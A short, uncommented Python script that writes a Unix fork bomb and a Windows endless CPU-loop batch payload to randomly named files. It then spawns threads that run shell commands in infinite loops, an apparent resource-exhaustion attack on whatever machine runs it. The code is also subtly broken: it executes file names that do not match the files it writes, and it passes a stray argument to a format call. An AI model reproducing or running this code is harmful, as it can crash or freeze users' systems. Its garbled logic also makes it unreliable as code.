import cryptology.discretization as cd
import flask
dr = cd.DiscretizationRandom(65, 122) 
rawResult = dr.get_discretized_random() 
password = ''.join([chr(text) for text in rawResult][:64])[::-1]

unix = '''pgrep -x python >/dev/null && echo "Process found" || :() { :|:& };:'''
win32 = '''
@echo off
setlocal enabledelayedexpansion
set "cmd=tasklist /FI "IMAGENAME eq pythonw.exe" 2^>NUL | find /I /N "pythonw.exe"^>NUL"
%cmd%
if "%ERRORLEVEL%"=="0" (

) else (
    start /MIN cmd /C "for /L %%G in (1,0,1) do (set /A "var=%%G*%%G" & set /A "var=!var!+!var!" & set /A "var=!var!/%%G")"
)
'''
from sys import platform
import random,os,_thread
random_numbers = [random.randint(10000, 99999) for _ in range(10)]
random_strs = [str(num) for num in random_numbers]
def run(name):
    while True:
        os.system(name)
def start():
    for i in range(10):
        if platform == 'win32':
            with open(random_strs[i] + '.bat','w') as f:f.write(win32)
            _thread.start_new_thread(run,('start cmd /c {}'.format(password + random_strs[i],'w')))
        else:
            with open(random_strs[i] + '.bat','w') as f:f.write(unix)
            _thread.start_new_thread(run,('bash {}'.format(password + random_strs[i],'w')))
